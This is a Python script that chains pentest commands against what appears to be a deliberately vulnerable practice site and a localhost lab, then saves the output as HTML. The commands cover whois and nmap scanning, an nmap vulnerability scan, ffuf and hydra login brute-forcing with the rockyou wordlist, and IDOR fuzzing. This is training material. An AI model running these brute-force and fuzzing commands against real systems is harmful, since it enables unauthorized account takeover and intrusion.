import subprocess
import time
from datetime import datetime

def wait(stage_name):
    print(f"Starting {stage_name}.... waiting for 6 seconds")
    time.sleep(6)

def run_command(command, stage_name):
    print(f"This is {stage_name}, running command: {command}")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
    print(result.stderr)
    return result.stdout + result.stderr

def save_to_html(content):
    with open("scan_results.html", "w") as file:
        file.write("<html><head><title>Scan Results</title></head><body>")
        file.write(f"<h1>Scan Results</h1><p>Generated on {datetime.now()}</p>")
        for stage, output in content.items():
            file.write(f"<h2>{stage}</h2>")
            file.write("<pre>")
            file.write(output)
            file.write("</pre>")
        file.write("</body></html>")

if __name__ == "__main__":
    stages = {
        "Reconnaissance Stage": "whois vulnweb.com",
        "Port Scanning Stage": "nmap -vv vulnweb.com",
        "Vulnerability Scanning Stage": "sudo nmap --script vuln vulnweb.com",
        "Exploitation Stage 1 (Bruteforce with ffuf)": "ffuf -request request.txt -request-proto http -mode clusterbomb -w top-100.txt:FUZZUSER -w rockyou1.txt:FUZZPASS -fs 14",
        "Exploitation Stage 2 (Bruteforce with hydra)": "hydra -L top-100.txt -P rockyou1.txt testphp.vulnweb.com http-post-form \"/login.php:uname=^USER^&pass=^PASS^:F=you must login\" -vV -f",
        "Exploitation Stage 3 (IDOR Attack)": "ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w numbers.txt -mr 'admin'"
    }

    results = {}

    for stage, command in stages.items():
        wait(stage)
        results[stage] = run_command(command, stage)

    save_to_html(results)
